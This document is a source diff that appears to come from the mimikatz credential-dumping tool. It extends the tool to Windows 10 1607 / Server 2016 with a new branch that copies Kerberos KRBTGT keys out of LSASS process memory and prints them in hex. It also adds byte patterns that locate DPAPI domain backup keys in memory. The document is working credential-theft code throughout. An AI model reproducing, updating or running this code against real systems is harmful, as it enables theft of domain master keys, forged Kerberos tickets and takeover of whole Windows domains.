@@ -460,6 +460,7 @@ NTSTATUS kuhl_m_sekurlsa_krbtgt(int argc, wchar_t * argv[])
 void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 {
 	DWORD sizeForCreds, i;
+	KIWI_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
 	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
 	KIWI_KRBTGT_CREDENTIALS_5 tmpCred5, *creds5;
 	KULL_M_MEMORY_ADDRESS aLsass = {addr, cLsass.hLsassMem}, aLocal = {&tmpCred6, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
@@ -467,7 +468,7 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 	if(addr)
 	{
 		kprintf(L"\n%s krbtgt: ", prefix);
-		if(cLsass.osContext.MajorVersion < 6)
+		if(cLsass.osContext.MajorVersion < 6) // TODO: a field offset table
 		{
 			aLocal.address = &tmpCred5;
 			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_5) - sizeof(KIWI_KRBTGT_CREDENTIAL_5)))
@@ -496,7 +497,7 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 				}
 			}
 		}
-		else
+		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607)
 		{
 			aLocal.address = &tmpCred6;
 			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6)))
@@ -522,6 +523,35 @@ void kuhl_m_sekurlsa_krbtgt_keys(PVOID addr, PCWSTR prefix)
 						}
 					}
 					LocalFree(creds6);
+				}
+			}
+		}
+		else
+		{
+			aLocal.address = &tmpCred64;
+			if(kull_m_memory_copy(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64)))
+			{
+				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
+				if(creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) LocalAlloc(LPTR, sizeForCreds))
+				{
+					aLocal.address = creds64;
+					if(kull_m_memory_copy(&aLocal, &aLsass, sizeForCreds))
+					{
+						kprintf(L"%u credentials\n", creds64->cbCred);
+						for(i = 0; i < creds64->cbCred; i++)
+						{
+							kprintf(L"\t * %s : ", kuhl_m_kerberos_ticket_etype(PtrToLong(creds64->credentials[i].type)));
+							aLsass.address = creds64->credentials[i].key;
+							if(aLocal.address = LocalAlloc(LPTR, PtrToUlong(creds64->credentials[i].size)))
+							{
+								if(kull_m_memory_copy(&aLocal, &aLsass, PtrToUlong(creds64->credentials[i].size)))
+									kull_m_string_wprintf_hex(aLocal.address, PtrToUlong(creds64->credentials[i].size), 0);
+								LocalFree(aLocal.address);
+							}
+							kprintf(L"\n");
+						}
+					}
+					LocalFree(creds64);
 				}
 			}
 		}
@@ -761,23 +791,27 @@ void kuhl_m_sekurlsa_bkey(PKUHL_M_SEKURLSA_CONTEXT cLsass, PKUHL_M_SEKURLSA_LIB 
 }
 
 BYTE PTRN_WALL_BackupKey[]			= {0xb9, 0x02, 0x00, 0x00, 0x00, 0x89, 0x05};
+BYTE PTRN_W2K16_BackupKey[]			= {0xb9, 0x02, 0x00, 0x00, 0x00, 0xe8};
 KULL_M_PATCH_GENERIC BackupKeyReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  37,  44}},
 	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  40,  47}},
 	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  33,  40}},
 	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_WALL_BackupKey),			PTRN_WALL_BackupKey},			{0, NULL}, {-4,  30,  37}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_BackupKey),			PTRN_W2K16_BackupKey},			{0, NULL}, {-10,  24,  31}},
 };
 BYTE PTRN_W2K3_BackupKeyCompat[]	= {0x45, 0x33, 0xc9, 0x48, 0xc7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0xe8};
 BYTE PTRN_W2K8_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd7, 0xe8};
 BYTE PTRN_W2K8R2_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xd6, 0xe8};
 BYTE PTRN_W2K12_BackupKeyCompat[]	= {0x85, 0xc0, 0x74, 0x21, 0x4c, 0x8d, 0x05};
 BYTE PTRN_W2K12R2_BackupKeyCompat[]	= {0xb9, 0x01, 0x00, 0x00, 0x00, 0xe8};
+BYTE PTRN_W2K16_BackupKeyCompat[]	= {0x85, 0xc0, 0x75, 0x1e, 0xe8};
 KULL_M_PATCH_GENERIC BackupKeyReferencesCompat[] = {
 	{KULL_M_WIN_BUILD_2K3,	{sizeof(PTRN_W2K3_BackupKeyCompat),		PTRN_W2K3_BackupKeyCompat},		{0, NULL}, {-4, -18, -11}},
 	{KULL_M_WIN_BUILD_VISTA,{sizeof(PTRN_W2K8_BackupKeyCompat),		PTRN_W2K8_BackupKeyCompat},		{0, NULL}, {-4,  26,  33}},
 	{KULL_M_WIN_BUILD_7,	{sizeof(PTRN_W2K8R2_BackupKeyCompat),	PTRN_W2K8R2_BackupKeyCompat},	{0, NULL}, {-4,  20,  27}},
 	{KULL_M_WIN_BUILD_8,	{sizeof(PTRN_W2K12_BackupKeyCompat),	PTRN_W2K12_BackupKeyCompat},	{0, NULL}, {21,   7,  14}},
 	{KULL_M_WIN_BUILD_BLUE,	{sizeof(PTRN_W2K12R2_BackupKeyCompat),	PTRN_W2K12R2_BackupKeyCompat},	{0, NULL}, {-4,  17,  24}},
+	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W2K16_BackupKeyCompat),	PTRN_W2K16_BackupKeyCompat},	{0, NULL}, {-9,  -23,  -16}},
 };
 NTSTATUS kuhl_m_sekurlsa_bkeys(int argc, wchar_t * argv[])
 {
